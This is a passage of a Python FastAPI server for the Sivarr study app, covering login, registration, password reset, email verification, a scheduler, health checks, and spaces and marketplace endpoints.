        sids = set(db.get_sids_with_blob_key("goals")) if db.is_available() else set(
            p.name.replace("_goals.json", "") for p in DATA_DIR.glob("*_goals.json")
        )
        purged = 0
        for sid in sids:
            goals = load_goals(sid)
            kept = []
            for g in goals:
                deleted_at = g.get("deleted_at")
                if deleted_at:
                    try:
                        if _dt.datetime.fromisoformat(deleted_at) < cutoff:
                            purged += 1
                            continue  # past retention — actually gone now
                    except ValueError:
                        pass  # malformed timestamp — keep it rather than guess
                kept.append(g)
            if len(kept) != len(goals):
                save_goals(sid, kept)
        if purged:
            log.info(f"Purged {purged} goals past the 30-day trash retention window")

    # ── Register jobs and start — wrapped so a failure never crashes the app ──
    try:
        import datetime as _tz_dt
        scheduler = AsyncIOScheduler(timezone=_tz_dt.timezone.utc)
        scheduler.add_job(_auto_weekly_reviews, CronTrigger(day_of_week="mon", hour=6, minute=0))
        scheduler.add_job(_purge_deleted_goals, CronTrigger(hour=4, minute=30))
        scheduler.add_job(_streak_reminders,    CronTrigger(hour=19, minute=0))
        scheduler.add_job(_task_due_alerts,     IntervalTrigger(minutes=15))
        scheduler.start()
        log.info("APScheduler started — weekly review (Mon 06:00 UTC) + push + goal-trash-purge (daily 04:30 UTC) jobs registered")
    except Exception as exc:
        log.warning(f"APScheduler failed to start ({exc}) — scheduled jobs disabled, app continues normally")


# ── Global error handler ──────────────────────────────────────

@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    """Catch all unhandled exceptions, log them, return a clean error ID — never a traceback."""
    error_id = str(uuid.uuid4())[:8]
    log.error(f"Unhandled error [{error_id}] {request.url.path}: {exc}\n{traceback.format_exc()}")
    return JSONResponse(
        status_code=500,
        content={"detail": f"Something went wrong. Error ID: {error_id}"}
    )


from fastapi.exceptions import RequestValidationError

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    """Return a clean 422 without exposing Pydantic's internal field paths."""
    return JSONResponse(
        status_code=422,
        content={"detail": "Invalid request data. Check your input and try again."}
    )

# ── Request models with validation ────────────────────────────

class LoginRequest(BaseModel):
    name: str     = ""          # required only for register
    email: str
    password: str = ""
    confirm_password: str = ""  # register only
    phone: str    = ""
    action: str   = "login"     # "login" | "register"

    @validator("email")
    def email_normalize(cls, v):
        # Hard-reject oversized raw input before any normalization so a caller
        # can't bypass the length check by sending HTML that strips down shorter.
        # Authoritative format checks then run in _validate_auth_input().
        raw = (v or "").strip()
        if len(raw) > MAX_EMAIL_LEN:
            return ""   # empty -> "email format/length" reject in _validate_auth_input
        return _strip_html(sanitize_text(raw, MAX_EMAIL_LEN)).lower().strip()


# ChatRequest now lives in routes/ai_chat.py, the only place that uses it.


# QuizRequest now lives in routes/quiz.py.


class DifficultyRequest(BaseModel):
    sid: str = ""
    token: str = ""
    level: str

    @validator("level")
    def level_valid(cls, v):
        if v not in ["easy", "medium", "hard"]:
            raise ValueError("Level must be easy, medium, or hard.")
        return v


class AdminLoginRequest(BaseModel):
    password: str
    totp: str = ""   # 6-digit 2FA code; required only when ADMIN_TOTP_SECRET is set

# ── Routes ────────────────────────────────────────────────────

@app.get("/api/config")
async def app_config():
    """Return public feature flags for the frontend (no secrets)."""
    return {
        "google_oauth":   GOOGLE_OAUTH_AVAILABLE,
        "github_oauth":   GITHUB_OAUTH_AVAILABLE,
        "paystack":       PAYSTACK_AVAILABLE,
        "version":        VERSION,
    }


@app.get("/", response_class=HTMLResponse)
async def landing():
    """Public landing page — served to everyone at the root URL.
    Rendered through Jinja (rather than read as raw text) so its asset URLs get
    the same content-hash cache-busting as the app shell — see core.py's asset()."""
    if Path("templates/landing.html").exists():
        return HTMLResponse(_get_jinja_env().get_template("landing.html").render())
    return RedirectResponse(url="/app", status_code=302)


@app.get("/terms", response_class=HTMLResponse)
async def terms():
    p = Path("templates/legal/terms.html")
    if p.exists():
        return p.read_text(encoding="utf-8")
    raise HTTPException(404, "Terms page not found")


@app.get("/privacy", response_class=HTMLResponse)
async def privacy():
    p = Path("templates/legal/privacy.html")
    if p.exists():
        return p.read_text(encoding="utf-8")
    raise HTTPException(404, "Privacy page not found")


def _serve_app() -> HTMLResponse:
    """Return the main SPA HTML rendered via Jinja2 (cached in production)."""
    global _APP_HTML_CACHE
    
    # Development: always re-render so template edits show immediately
    if os.environ.get("RAILWAY_ENVIRONMENT", "production") == "development":
        env = _get_jinja_env()
        config = json.dumps({
            "sentry_dsn":       SENTRY_DSN,
            "paystack_pk":      PAYSTACK_PUBLIC_KEY,
            "version":          VERSION,
            "environment":      os.environ.get("RAILWAY_ENVIRONMENT", "production"),
            "plausible_domain": PLAUSIBLE_DOMAIN,
        })
        html = env.get_template("index.html").render(config=config)
        return HTMLResponse(html)
    
    # Production: cached rendering (one render per worker, re-uses cached result)
    if _APP_HTML_CACHE is None:
        env = _get_jinja_env()
        config = json.dumps({
            "sentry_dsn":       SENTRY_DSN,
            "paystack_pk":      PAYSTACK_PUBLIC_KEY,
            "version":          VERSION,
            "environment":      os.environ.get("RAILWAY_ENVIRONMENT", "production"),
            "plausible_domain": PLAUSIBLE_DOMAIN,
        })
        _APP_HTML_CACHE = env.get_template("index.html").render(config=config)
    return HTMLResponse(_APP_HTML_CACHE)


@app.get("/app", response_class=HTMLResponse)
async def app_index():
    """Main SPA — the logged-in workspace."""
    return _serve_app()


@app.get("/billing/callback")
async def billing_callback(reference: str = "", trxref: str = "", plan: str = ""):
    """Paystack billing redirect — forward to SPA with billing params."""
    ref = reference or trxref
    if not ref:
        return RedirectResponse(url="/app", status_code=302)
    return RedirectResponse(
        url=f"/app?billing=success&ref={ref}&plan={plan}",
        status_code=302,
    )


@app.get("/sw.js")
async def service_worker():
    # Rendered so its precache URLs carry the same content hashes index.html uses,
    # and so CACHE changes automatically when any of those assets change.
    src = Path("js/sw.js").read_text(encoding="utf-8")
    rendered = _get_jinja_env().from_string(src).render(sw_version=sw_cache_version())
    return Response(
        content=rendered,
        media_type="application/javascript",
        headers={"Service-Worker-Allowed": "/", "Cache-Control": "no-store, no-cache"},
    )

def _admin_basic_auth(request: Request) -> bool:
    """Validate HTTP Basic Auth against ADMIN_PASSWORD for admin HTML pages."""
    import base64
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Basic "):
        return False
    try:
        _, password = base64.b64decode(auth[6:]).decode().split(":", 1)
        return bool(ADMIN_PASSWORD) and hmac.compare_digest(password, ADMIN_PASSWORD)
    except Exception:
        return False

_BASIC_AUTH_CHALLENGE = Response(
    status_code=401,
    headers={"WWW-Authenticate": "Basic realm=\"Sivarr Admin\""},
)

@app.get("/admin", response_class=HTMLResponse)
async def admin_page(request: Request):
    if not _admin_basic_auth(request):
        return _BASIC_AUTH_CHALLENGE
    return Path("templates/admin.html").read_text(encoding="utf-8")

@app.get("/admin/metrics", response_class=HTMLResponse)
async def admin_metrics_page(request: Request):
    if not _admin_basic_auth(request):
        return _BASIC_AUTH_CHALLENGE
    return Path("templates/admin_metrics.html").read_text(encoding="utf-8")


# Precomputed bcrypt hash used only to equalise login timing for non-existent
# accounts (anti-enumeration) — never matches any real password.
_DUMMY_PW_HASH = bcrypt.hashpw(b"sivarr-timing-equaliser", bcrypt.gensalt())


def _validate_auth_input(req: "LoginRequest", client_key: str) -> tuple[str, str, str]:
    """Authoritative server-side validation for /api/login (login + register),
    independent of any client-side checks. Validates format + length for every
    field and strips HTML/script from free-text. On ANY invalid input it logs the
    specific reason server-side (for monitoring) and raises a single GENERIC error
    that never reveals which field failed (anti-enumeration / anti-probing).
    Returns the cleaned (email, name, phone)."""
    def reject(reason: str):
        log.warning(f"Auth input rejected [{req.action}] from {client_key}: {reason}")
        raise HTTPException(400, "Please check your details and try again.")

    is_register = (req.action == "register")

    # Email — format + length (already HTML-stripped + lowercased by the model)
    email = _strip_html(sanitize_text(req.email, MAX_EMAIL_LEN)).lower().strip()
    if not email or len(email) > MAX_EMAIL_LEN or not _AUTH_EMAIL_RE.match(email):
        reject("email format/length")

    # Display name — register only; letters/spaces/-'. , 2..MAX_NAME_LEN
    name = ""
    if is_register:
        name = _strip_html(sanitize_text(req.name, MAX_NAME_LEN)).strip()
        if not (2 <= len(name) <= MAX_NAME_LEN) or not _AUTH_NAME_RE.match(name):
            reject("name format/length")

    # Password — length policy (min on register, max always to bound bcrypt input)
    pw = req.password or ""
    if is_register:
        if not (8 <= len(pw) <= MAX_PASSWORD_LEN):
            reject("password length policy")
        if req.confirm_password and req.confirm_password != pw:
            reject("password confirmation mismatch")
    else:
        if not pw or len(pw) > MAX_PASSWORD_LEN:
            reject("login password missing/oversize")

    phone = _strip_html(sanitize_text(req.phone, 30)).strip()
    return email, name, phone


@app.post("/api/login")
async def login(req: LoginRequest, request: Request, bg: BackgroundTasks, response: Response):
    key = get_client_key(request)
    check_rate_limit(key, RATE_LIMIT_LOGIN, "login")

    # Authoritative server-side validation (format + length + HTML strip); raises
    # a single generic 400 and logs specifics. Never trusts client-side checks.
    email, reg_name, reg_phone = _validate_auth_input(req, key)
    _check_account_lockout(email)   # raise 429 early if account is locked
    users = load_users()

    # ── REGISTER ──────────────────────────────────────────────
    if req.action == "register":
        name = reg_name

        # Reject duplicate emails — but distinguish a passwordless (Google) account.
        # The owner can claim it by setting a password via an emailed link (the
        # password-reset flow), so signal that case distinctly to the client.
        existing = next((u for u in users.values() if u.get("email", "").lower() == email), None)
        if not existing and db.is_available():
            existing = db.get_user_by_email(email)
        if existing:
            if not existing.get("password", ""):
                raise HTTPException(409, "account_is_passwordless")
            raise HTTPException(409, "An account with this email already exists. Sign in instead.")

        # Generate a random UUID-based SID (not derived from user-supplied data)
        sid    = uuid.uuid4().hex[:20]
        hashed = bcrypt.hashpw(req.password.encode(), bcrypt.gensalt()).decode()
        users[sid] = {
            "sid":      sid,
            "name":     name.title(),
            "email":    email,
            "phone":    reg_phone,
            "password": hashed,
            "created":  datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            "role":     "student",
        }
        save_users(users)
        # Explicitly persist to DB — save_users() may silently skip the new user
        # if a bulk DB sync error occurs (common on Railway after dyno restart)
        if db.is_available() and not db.user_exists(sid):
            try:
                db.create_user(users[sid])
            except Exception as _e:
                log.error(f"Critical: failed to persist new user {sid} to DB: {_e}")
        user = users[sid]
        log.info(f"Register: {user['name']} ({email})")
        # Send verification email in background (don't block registration)
        verify_token = db.create_email_verify_token(sid, email)
        verify_url   = f"{BASE_URL}/api/auth/verify-email/{verify_token}"
        bg.add_task(send_email, email,
                    "Verify your Sivarr email",
                    _email_verify_html(verify_url, user['name']))
        # The welcome email now fires on first successful verification
        # (verify_email_endpoint), so "your workspace is ready" is actually true.
        # Google-OAuth sign-ups get it at account creation (email pre-verified).

    # ── LOGIN ──────────────────────────────────────────────────
    else:
        # Look up by email — no name required
        user = next((u for u in users.values() if u.get("email", "").lower() == email), None)
        # Fallback to DB lookup
        if not user and db.is_available():
            user = db.get_user_by_email(email)

        if not user:
            # Anti-enumeration: same generic message AND comparable timing as a
            # wrong password (burn a dummy bcrypt) so an attacker can't tell a
            # non-existent email from a wrong password by reply text or latency.
            try:
                bcrypt.checkpw((req.password or "x").encode(), _DUMMY_PW_HASH)
            except Exception:
                pass
            raise HTTPException(401, "Invalid email or password.")

        stored = user.get("password", "")
        if not stored:
            raise HTTPException(401, "google_only_account")
        if not req.password:
            raise HTTPException(401, "Invalid email or password.")
        if not bcrypt.checkpw(req.password.encode(), stored.encode()):
            _record_failed_login(email)
            raise HTTPException(401, "Invalid email or password.")

        _clear_failed_login(email)   # reset counter on correct password
        sid = user["sid"]

        # Block login until email is confirmed (only enforced when DB is reachable).
        # Auto-resend the link so the user has something actionable.
        if db.is_available() and not db.is_email_verified(sid):
            verify_token = db.create_email_verify_token(sid, email)
            verify_url   = f"{BASE_URL}/api/auth/verify-email/{verify_token}"
            bg.add_task(send_email, email, "Verify your Sivarr email",
                        _email_verify_html(verify_url, user.get("name", "")))
            raise HTTPException(403, "email_not_verified")

    p = load_progress(sid)
    p["sessions"] = p.get("sessions", 0) + 1
    p["name"]  = user["name"]
    p["email"] = user["email"]
    save_progress(sid, p)

    memory = build_memory(p)
    # AI chat session init must never block authentication — if Gemini is
    # unavailable or misconfigured, login/register must still succeed.
    try:
        get_sessions(sid, memory)
    except Exception as _ai_e:
        log.warning(f"AI session init deferred (non-fatal) for {sid}: {_ai_e}")

    cleanup_expired_tokens()
    token = create_session_token(sid, user["name"], user["email"])

    log.info(f"{'Register' if req.action=='register' else 'Login'}: {user['name']} ({email}) | Sessions: {p['sessions']}")

    spaces = db.get_all_spaces_with_data(sid) if db.is_available() else []

    _set_session_cookie(response, token)
    return {
        "sid": sid, "name": user["name"], "email": user["email"],
        "token": token,
        "sessions": p["sessions"], "difficulty": p.get("difficulty", "medium"),
        "topics": list(p.get("topics", {}).keys()), "weak": weak_topics(p),
        "questions": p.get("questions", 0), "quizzes": len(p.get("quizzes", [])),
        "wrong_count": len(p.get("wrong_answers", [])), "returning": bool(db.get_user_blob(sid, "onboarding")) if db.is_available() else p["sessions"] > 1,
        "uploaded_files": p.get("uploaded_files", []),
        "spaces": spaces,
        "email_verified": db.is_email_verified(sid) if db.is_available() else True,
    }


@app.post("/api/session/restore")
async def session_restore(data: dict, response: Response):
    """
    Restore a session from a saved token — no password re-entry needed.
    Called on page reload when the client has a stored token (or, P3b, from the
    httpOnly cookie when no body token is sent).
    """
    token = sanitize_text(str(data.get("token", "")), 100)
    if not token:
        token = sanitize_text(_req_token.get(""), 100)
    if not token:
        raise HTTPException(401, "Token required.")

    entry = get_session_from_token(token)
    if not entry:
        raise HTTPException(401, "Session expired. Please sign in again.")

    sid   = entry["sid"]
    name  = entry["name"]
    email = entry["email"]

    p = load_progress(sid)
    # Increment session counter only if it's been more than 30 min since last save
    last_restore = p.get("last_restore_ts", 0)
    now_ts = time.time()
    if now_ts - last_restore > 1800:
        p["sessions"] = p.get("sessions", 0) + 1
        p["last_restore_ts"] = now_ts
        save_progress(sid, p)

    memory = build_memory(p)
    # AI chat session init must never block session restore.
    try:
        get_sessions(sid, memory)
    except Exception as _ai_e:
        log.warning(f"AI session init deferred (non-fatal) for {sid}: {_ai_e}")

    log.info(f"Session restored: {name} ({email})")

    spaces = db.get_all_spaces_with_data(sid) if db.is_available() else []

    _set_session_cookie(response, token)
    return {
        "sid": sid, "name": p.get("name", name), "email": p.get("email", email),
        "token": token,
        "sessions": p["sessions"], "difficulty": p.get("difficulty", "medium"),
        "topics": list(p.get("topics", {}).keys()), "weak": weak_topics(p),
        "questions": p.get("questions", 0), "quizzes": len(p.get("quizzes", [])),
        "wrong_count": len(p.get("wrong_answers", [])), "returning": bool(db.get_user_blob(sid, "onboarding")) if db.is_available() else p["sessions"] > 1,
        "uploaded_files": p.get("uploaded_files", []),
        "spaces": spaces,
        "email_verified": db.is_email_verified(sid) if db.is_available() else True,
    }


@app.post("/api/logout")
async def logout(data: dict, response: Response):
    """Invalidate a session token. Falls back to the httpOnly cookie token so a
    post-reload logout (no body token, in-memory token gone) still revokes the
    server-side session, not just clears the cookie."""
    token = sanitize_text(str(data.get("token", "")), 100)
    if not token:
        token = sanitize_text(_req_token.get(""), 100)
    if token:
        delete_session_token(token)
    _clear_session_cookie(response)
    return {"ok": True}


@app.post("/api/admin/test-email")
async def test_email(data: dict):
    """Email diagnostic. Send POST {\"to\": \"email\", \"key\": \"ADMIN_PASSWORD\"}"""
    key = sanitize_text(str(data.get("key", "")), 200)
    to  = sanitize_text(str(data.get("to", "")), 200)
    if not ADMIN_PASSWORD or not hmac.compare_digest(key, ADMIN_PASSWORD):
        raise HTTPException(403, "Wrong key.")
    target = to or "djhunterd712@gmail.com"
    provider = "gmail" if _gmail_configured() else ("resend" if _resend_configured() else "none")
    ok, detail = send_email(
        target,
        "Sivarr email test",
        "<h2>Email is working ✓</h2><p>Transactional email is configured correctly on your Railway deployment.</p>"
    )
    # Map the most common failure modes to a one-line next action.
    hint = ""
    if not ok:
        low = (detail or "").lower()
        if provider == "none":
            hint = "No provider configured. Fast unblock: set GMAIL_USER + GMAIL_APP_PASSWORD (Gmail App Password) in Railway."
        elif "verify" in low or "domain" in low or "not verified" in low:
            hint = (f"Resend is rejecting the sender domain in RESEND_FROM_EMAIL ({RESEND_FROM}). "
                    "Either verify that domain in Resend (SPF/DKIM DNS), or set GMAIL_USER + GMAIL_APP_PASSWORD to switch to Gmail.")
        elif "auth" in low or "login" in low or "password" in low or "username" in low:
            hint = "Provider rejected credentials. Check GMAIL_APP_PASSWORD is a 16-char App Password (not your account password), or RESEND_API_KEY."
        else:
            hint = "Send failed. See 'detail'. Confirm the active provider's credentials in Railway Variables."
    return {
        "sent": ok,
        "detail": detail,
        "provider": provider,
        "hint": hint,
        "gmail_configured": _gmail_configured(),
        "gmail_user": GMAIL_USER or "(not set)",
        "resend_api_key_set": bool(RESEND_API_KEY),
        "resend_from": RESEND_FROM,
        "to": target,
    }


@app.post("/api/auth/forgot-password")
async def forgot_password(data: dict, request: Request, bg: BackgroundTasks):
    # Rate-limit to prevent reset-email flooding of a victim + email-quota exhaustion
    # (mirrors the limit on /api/auth/request-verification).
    check_rate_limit(get_client_key(request), RATE_LIMIT_VERIFY, "forgot_password")
    email = sanitize_text(str(data.get("email", "")), 200).lower().strip()
    if not email:
        raise HTTPException(400, "Email required.")
    # Always return 200 — never reveal whether email exists (prevents enumeration)
    user = db.get_user_by_email(email) if db.is_available() else None
    if not user:
        # Try JSON fallback
        users = load_users()
        user = next((u for u in users.values() if u.get("email", "").lower() == email), None)
    if user:
        sid = user.get("sid") or user.get("id", "")
        reset_token = db.create_reset_token(sid, email)
        reset_url   = f"{BASE_URL}/?reset={reset_token}"
        bg.add_task(send_email, email,
                    "Reset your Sivarr password",
                    _email_reset_html(reset_url))
    return {"ok": True, "message": "If that email exists, a reset link has been sent."}


@app.post("/api/auth/change-password")
async def change_password(data: dict):
    token        = sanitize_text(str(data.get("token", "")), 200)
    current_pw   = str(data.get("current_password", ""))
    new_pw       = str(data.get("new_password", ""))
    if not token:
        raise HTTPException(401, "Authentication required.")
    if not current_pw or not new_pw:
        raise HTTPException(400, "Current and new password are required.")
    if len(new_pw) < 8:
        raise HTTPException(400, "New password must be at least 8 characters.")
    entry = get_session_from_token(token)
    if not entry:
        raise HTTPException(401, "Session expired. Please sign in again.")
    sid  = entry["sid"]
    user = db.get_user(sid) if db.is_available() else None
    if not user:
        raise HTTPException(404, "User not found.")
    stored = user.get("password", "")
    if not stored:
        raise HTTPException(400, "This account uses social sign-in. Password changes are not available.")
    if not bcrypt.checkpw(current_pw.encode(), stored.encode()):
        raise HTTPException(400, "Current password is incorrect.")
    hashed = bcrypt.hashpw(new_pw.encode(), bcrypt.gensalt()).decode()
    _persist_password(sid, hashed)   # both stores — login reads the file first
    # Revoke every OTHER session for this user (a stolen token elsewhere dies),
    # but keep the current device signed in.
    delete_all_sessions(sid, except_token=token)
    return {"ok": True, "message": "Password updated successfully. Other devices have been signed out."}


@app.post("/api/auth/reset-password")
async def reset_password(data: dict):
    token    = sanitize_text(str(data.get("token", "")), 200)
    password = str(data.get("password", ""))
    if not token or not password:
        raise HTTPException(400, "Token and new password required.")
    if len(password) < 8:
        raise HTTPException(400, "Password must be at least 8 characters.")
    rec = db.get_reset_token(token)
    if not rec:
        raise HTTPException(400, "Reset link is invalid or has expired.")
    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
    _persist_password(rec["sid"], hashed)   # both stores — login reads the file first
    db.mark_reset_token_used(token)
    # Reset is unauthenticated (email link) — revoke ALL existing sessions so any
    # attacker holding a stolen token is locked out the moment the owner resets.
    delete_all_sessions(rec["sid"])
    return {"ok": True, "message": "Password updated. You can now sign in."}


@app.get("/api/auth/verify-email/{token}")
async def verify_email_endpoint(token: str, bg: BackgroundTasks):
    rec = db.get_email_verify_token(token)
    if not rec:
        return RedirectResponse(url="/app?verified=error", status_code=302)
    sid = rec["sid"]
    already = db.is_email_verified(sid)
    db.mark_email_verified(sid)
    if not already:
        # First-time verification → the workspace is now live, so send the welcome.
        # Guarded by `already` so re-clicking the link doesn't re-send it.
        email = rec.get("email", "")
        u = db.get_user(sid) or load_users().get(sid) or {}
        if email:
            bg.add_task(send_email, email,
                        "Welcome to Sivarr, your workspace is ready",
                        _email_welcome_html(u.get("name", "")))
    return RedirectResponse(url="/app?verified=1", status_code=302)


@app.post("/api/auth/resend-verification")
async def resend_verification(data: dict, bg: BackgroundTasks):
    token = sanitize_text(str(data.get("token", "")), 100)
    if not token:
        raise HTTPException(400, "Token required.")
    entry = get_session_from_token(token)
    if not entry:
        raise HTTPException(401, "Session expired.")
    sid   = entry["sid"]
    email = entry["email"]
    if db.is_email_verified(sid):
        return {"ok": True, "message": "Already verified."}
    verify_token = db.create_email_verify_token(sid, email)
    verify_url   = f"{BASE_URL}/api/auth/verify-email/{verify_token}"
    bg.add_task(send_email, email, "Verify your Sivarr email",
                _email_verify_html(verify_url, entry.get("name", "")))
    return {"ok": True}


@app.post("/api/auth/request-verification")
async def request_verification_email(data: dict, request: Request, bg: BackgroundTasks):
    """Public endpoint — no session required. Queues a verification email if the account exists and
    is not yet verified. Always returns 200 to prevent email enumeration."""
    key = get_client_key(request)
    check_rate_limit(key, RATE_LIMIT_VERIFY, "request_verification")
    email = sanitize_text(str(data.get("email", "")), 200).lower().strip()
    if not email:
        return {"ok": True}
    users = load_users()
    user = next((u for u in users.values() if u.get("email", "").lower() == email), None)
    if not user and db.is_available():
        user = db.get_user_by_email(email)
    if user and not db.is_email_verified(user["sid"]):
        verify_token = db.create_email_verify_token(user["sid"], email)
        verify_url   = f"{BASE_URL}/api/auth/verify-email/{verify_token}"
        bg.add_task(send_email, email, "Verify your Sivarr email",
                    _email_verify_html(verify_url, user.get("name", "")))
    return {"ok": True}


@app.get("/api/health")
async def health():
    # Honest health: do a LIVE DB ping (not just "is DATABASE_URL set"), and report
    # Redis + pool state. Previously this always returned status:ok / db:is_available()
    # so it stayed green even when Postgres was unreachable.
    db_info = await asyncio.to_thread(db.db_test)
    db_ok   = db_info.get("ping", False)
    return {
        "status":          "ok" if db_ok else "degraded",
        "version":         VERSION,
        "uptime_s":        int(time.time() - _START_TIME),
        "db":              db_ok,
        "db_ms":           db_info.get("latency_ms"),
        "db_error":        db_info.get("error"),
        "db_pool":         db.pool_stats(),
        "redis":           rcache.available(),
        "secrets_encrypted": db.encryption_active(),
        "ai":              GEMINI_AVAILABLE,
        "active_sessions": len(_session_tokens),
        "chat_sessions":   len(_chat_sessions),
        "slow_queries":    db.slow_query_count(),
        "time":            datetime.datetime.utcnow().isoformat() + "Z",
    }


# ── Leaderboard (B1 fix) ──────────────────────────────────────────
_LEADERBOARD_CACHE = {"ts": 0.0, "data": None}

def _compute_leaderboard() -> dict:
    """Global student ranking by quiz average. Only ranks users who have taken
    at least one quiz; sorted by avg score then quiz count. Works in file + DB
    mode (load_users / load_progress both handle either)."""
    rows = []
    for sid, u in load_users().items():
        try:
            p = load_progress(sid)
        except Exception:
            continue
        quizzes = p.get("quizzes", []) or []
        if not quizzes:
            continue
        avg = sum(float(q.get("score", 0)) for q in quizzes) / len(quizzes) * 100
        rows.append({
            "sid":       sid,
            "name":      u.get("name", "Student"),
            "quizzes":   len(quizzes),
            "questions": int(p.get("questions", 0) or 0),
            "avg_score": round(avg, 1),
        })
    rows.sort(key=lambda r: (r["avg_score"], r["quizzes"]), reverse=True)
    return {"leaderboard": rows[:50]}


@app.get("/api/leaderboard")
async def leaderboard():
    """Top quiz-takers for the Leaderboard panel. 60s cache so iterating all
    users stays cheap; computed in a thread so it never blocks the event loop."""
    now = time.time()
    if _LEADERBOARD_CACHE["data"] is not None and now - _LEADERBOARD_CACHE["ts"] < 60:
        return _LEADERBOARD_CACHE["data"]
    result = await asyncio.to_thread(_compute_leaderboard)
    _LEADERBOARD_CACHE.update(ts=now, data=result)
    return result


# ── Spaces API ────────────────────────────────────────────────────
# _resolve_token now lives in core.py (imported at the top of this file).


@app.post("/api/spaces/list")
async def spaces_list(data: dict):
    """Return all spaces + their data blobs for the authenticated user."""
    sid, _ = _resolve_token(data)
    spaces = db.get_all_spaces_with_data(sid)
    return {"spaces": spaces}


@app.post("/api/spaces/sync")
async def spaces_sync(data: dict):
    """Upsert a single space's metadata (name, icon, type)."""
    sid, _ = _resolve_token(data)
    space = data.get("space")
    if not space or not space.get("id") or not space.get("name"):
        raise HTTPException(400, "space.id and space.name are required.")
    space_id = sanitize_text(str(space["id"]), 60)
    # Quota gating: cap the number of personal spaces on limited plans. Existing
    # spaces always re-sync (cross-device); only a NEW space beyond the cap is blocked.
    cap = _plan_caps(load_progress(sid)).get("spaces")
    if cap is not None:
        existing_ids = {s.get("id") for s in (db.get_spaces(sid) or [])}
        if space_id not in existing_ids and len(existing_ids) >= cap:
            raise HTTPException(402, f"Your plan includes {cap} space{'s' if cap != 1 else ''}. Upgrade to add more.")
    db.save_space(sid, {
        "id":   space_id,
        "name": sanitize_text(str(space["name"]), 120),
        "icon": sanitize_text(str(space.get("icon", "🧩")), 10),
        "color": sanitize_text(str(space.get("color", "#4f6ef7")), 20),
        "type": sanitize_text(str(space.get("type", "personal")), 20),
    })
    return {"ok": True}


@app.post("/api/spaces/data/save")
async def spaces_data_save(data: dict):
    """Save a space's data blob."""
    sid, _ = _resolve_token(data)
    space_id = sanitize_text(str(data.get("space_id", "")), 60)
    blob     = data.get("data")
    if not space_id:
        raise HTTPException(400, "space_id required.")
    if not isinstance(blob, dict):
        raise HTTPException(400, "data must be a JSON object.")
    db.save_space_data(sid, space_id, blob)
    return {"ok": True}


@app.post("/api/spaces/delete")
async def spaces_delete(data: dict):
    """Delete a space and its data."""
    sid, _ = _resolve_token(data)
    space_id = sanitize_text(str(data.get("space_id", "")), 60)
    if not space_id:
        raise HTTPException(400, "space_id required.")
    db.delete_space(sid, space_id)
    return {"ok": True}


# ── Marketplace persistence (Postgres collections, per-user; token-gated) ──
#  mkt_installs  (owner=sid, item_id="{sid}:{id}")
#  mkt_reviews   (owner=item_id, item_id="{item}:{sid}")
#  mkt_listings  (owner=sid, item_id=listing_id)
@app.post("/api/marketplace/installed")
async def marketplace_installed(data: dict):
    sid, _ = _resolve_token(data)
    rows = db.coll_list("mkt_installs", owner=sid)
    return {"ok": True, "installed": [{"id": r.get("item_id"), "ts": r.get("ts", "")} for r in rows if r.get("item_id")]}


@app.post("/api/marketplace/install")
async def marketplace_install(data: dict):
    sid, _ = _resolve_token(data)
    iid = sanitize_text(str(data.get("item_id", "")), 60)
    if iid:
        db.coll_put("mkt_installs", f"{sid}:{iid}",
                    {"item_id": iid, "sid": sid, "ts": datetime.datetime.utcnow().isoformat()}, owner=sid)
    return {"ok": True}


@app.post("/api/marketplace/uninstall")
async def marketplace_uninstall(data: dict):
    sid, _ = _resolve_token(data)
    iid = sanitize_text(str(data.get("item_id", "")), 60)
    if iid:
        db.coll_delete("mkt_installs", f"{sid}:{iid}")
    return {"ok": True}


# ── Per-space marketplace prefs: which extensions/integrations are enabled for
#    each space. Persisted so they follow the user across devices (installs
#    already do). mkt_space_prefs (owner=sid, item_id="{sid}:{space_id}").
@app.post("/api/space/prefs/get")
async def space_prefs_get(data: dict):
    sid, _ = _resolve_token(data)
    prefs = {}
    for r in db.coll_list("mkt_space_prefs", owner=sid):
        spid = r.get("space_id")
        if spid:
            prefs[spid] = {"exts": r.get("exts", []) or [], "ints": r.get("ints", []) or []}
    return {"ok": True, "prefs": prefs}


@app.post("/api/space/prefs/set")
async def space_prefs_set(data: dict):
    sid, _ = _resolve_token(data)
    space_id = sanitize_text(str(data.get("space_id", "")), 60)
    if not space_id:
        raise HTTPException(400, "space_id is required.")
    rec = db.coll_get("mkt_space_prefs", f"{sid}:{space_id}") or {}
    rec["sid"] = sid
    rec["space_id"] = space_id
    if "exts" in data:
        rec["exts"] = [sanitize_text(str(x), 60) for x in (data.get("exts") or [])[:50] if str(x).strip()]
    if "ints" in data:
        rec["ints"] = [sanitize_text(str(x), 60) for x in (data.get("ints") or [])[:50] if str(x).strip()]
    rec.setdefault("exts", [])
    rec.setdefault("ints", [])
    db.coll_put("mkt_space_prefs", f"{sid}:{space_id}", rec, owner=sid)
    return {"ok": True}


@app.post("/api/marketplace/reviews/list")
async def marketplace_reviews_list(data: dict):
    _resolve_token(data)  # any signed-in user may read reviews
    iid = sanitize_text(str(data.get("item_id", "")), 60)
    rows = sorted(db.coll_list("mkt_reviews", owner=iid), key=lambda r: r.get("ts", ""), reverse=True)
    return {"ok": True, "reviews": [{"author": r.get("author"), "rating": r.get("rating", 0),
                                     "body": r.get("body", ""), "date": r.get("date", "")} for r in rows]}


@app.post("/api/marketplace/reviews")
async def marketplace_review(data: dict):
    sid, name = _resolve_token(data)
    iid = sanitize_text(str(data.get("item_id", "")), 60)
    try:
        rating = max(1, min(5, int(data.get("rating", 0))))
    except Exception:
        rating = 0
    body = sanitize_text(str(data.get("body", "")), 2000)
    if not iid or not body or not rating:
        raise HTTPException(400, "item_id, rating (1-5) and body are required.")
    db.coll_put("mkt_reviews", f"{iid}:{sid}",
                {"item_id": iid, "sid": sid, "author": name, "rating": rating, "body": body,
                 "date": datetime.datetime.utcnow().strftime("%d %b %Y"),
                 "ts": datetime.datetime.utcnow().isoformat()}, owner=iid)
    return {"ok": True}


@app.post("/api/marketplace/my-listings")
async def marketplace_my_listings(data: dict):
    sid, _ = _resolve_token(data)
    return {"ok": True, "listings": db.coll_list("mkt_listings", owner=sid)}


@app.post("/api/marketplace/publish")
async def marketplace_publish(data: dict):
    """Queue a listing for Sivarr team review (stored; status=review)."""
    sid, name = _resolve_token(data)
    name_v = sanitize_text(str(data.get("name", "")), 120)
    if not name_v:
